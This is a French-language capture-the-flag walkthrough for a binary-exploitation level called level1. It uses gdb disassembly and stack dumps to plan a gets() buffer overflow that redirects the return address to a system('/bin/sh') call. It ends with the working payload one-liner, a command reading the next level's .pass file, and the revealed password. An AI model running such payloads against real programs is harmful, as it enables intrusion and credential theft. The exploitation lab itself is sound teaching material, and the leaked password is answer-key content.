Dans ce niveau nous allons appeler la finction run afin de lancer la command system(/bin/sh)
Pour cela il faut:
1 - recuperer l'address de la command system(/bin/sh)

(gdb) x run
0x8048444 <run>:	0x83e58955

(gdb) disas run
Dump of assembler code for function run:
   0x08048444 <+0>:	push   %ebp
   0x08048445 <+1>:	mov    %esp,%ebp
   0x08048447 <+3>:	sub    $0x18,%esp
   0x0804844a <+6>:	mov    0x80497c0,%eax
   0x0804844f <+11>:	mov    %eax,%edx
   0x08048451 <+13>:	mov    $0x8048570,%eax
   0x08048456 <+18>:	mov    %edx,0xc(%esp)
   0x0804845a <+22>:	movl   $0x13,0x8(%esp)
   0x08048462 <+30>:	movl   $0x1,0x4(%esp)
   0x0804846a <+38>:	mov    %eax,(%esp)
   0x0804846d <+41>:	call   0x8048350 <fwrite@plt>
   0x08048472 <+46>:	movl   $0x8048584,(%esp)	<-- start of call system /bin/sh
   0x08048479 <+53>:	call   0x8048360 <system@plt>
   0x0804847e <+58>:	leave
   0x0804847f <+59>:	ret
End of assembler dump.


2 - trouver l'addresse de l'EIP (Pointeur d’Instruction) de retour du main
EIP correspondant a la prochaine d’Instruction que le processeurs executera une fois la fonction main terminer


(gdb) x/24 $esp
0xbffff6b0:	0xbffff6c0	0x0000002f	0xbffff70c	0xb7fd0ff4
0xbffff6c0:	0x080484a0	0x0804978c	0x00000001	0x08048321
0xbffff6d0:	0xb7fd13e4	0x00000016	0x0804978c	0x080484c1
0xbffff6e0:	0xffffffff	0xb7e5edc6	0xb7fd0ff4	0xb7e5ee55
0xbffff6f0:	0xb7fed280	0x00000000	0x080484a9	0xb7fd0ff4
0xbffff700:	0x080484a0	0x00000000	0x00000000	0xb7e454d3 <-- EIP a reecrire dans la stack


une fois c'est 2 informations recuperer nous pouvons faire un buffer overflow sur la fonction gets du main afin de depasser
les 76 octects prevu pour le gets et d'aller jusqu'a l'EIP et remplacer l'instruction de retour ecrite par l'addresse de system(bin/sh)

void main(void)
{
    char tab[76];
    
    gets(tab);
    return;
}

							         0xbffff6b0:	0xbffff6c0	0x0000002f	0xbffff70c	0xb7fd0ff4
-->	start of user input		0xbffff6c0:	0x41414141	0x41414141	0x41414141	0x41414141
							         0xbffff6d0:	0x41414141	0x41414141	0x41414141	0x41414141
							         0xbffff6e0:	0x41414141	0x41414141	0x41414141	0x41414141
							         0xbffff6f0:	0x41414141	0x41414141	0x41414141	0x41414141
							         0xbffff700:	0x41414141	0x00414141	0x00000000	0xb7e454d3 <-- EIP



cat <(python -c "print('A' * 76 + '\x72\x84\x04\x08')") - | ./level1
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77